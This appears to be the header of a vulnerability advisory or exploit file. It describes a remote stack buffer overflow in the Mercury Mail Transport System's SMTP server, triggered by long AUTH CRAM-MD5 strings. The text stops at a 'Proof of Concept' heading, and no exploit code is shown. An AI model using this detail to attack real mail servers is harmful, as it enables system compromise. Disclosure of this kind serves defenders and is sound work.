# Mercury Mail Transport System Remote Stack Based Overflow
# Overview
# Mercury Mail Transport System: Mercury is a free, standards-based mail server
# solution, providing comprehensive, fast server support for all major Internet e-
# mail protocols. It is supplied in two versions, one hosted on Windows systems,
# the other running as a set of NLMs on Novell NetWare file servers.
# Description
# There is a remotely exploitable stack based buffer overrun in the latest version of
# Mercury Mail Transport System. Specifically the SMTP Server does not properly
# handle long AUTH CRAM-MD5 strings resulting in a complete compromise of the
# underlying system.
# Proof of Concept
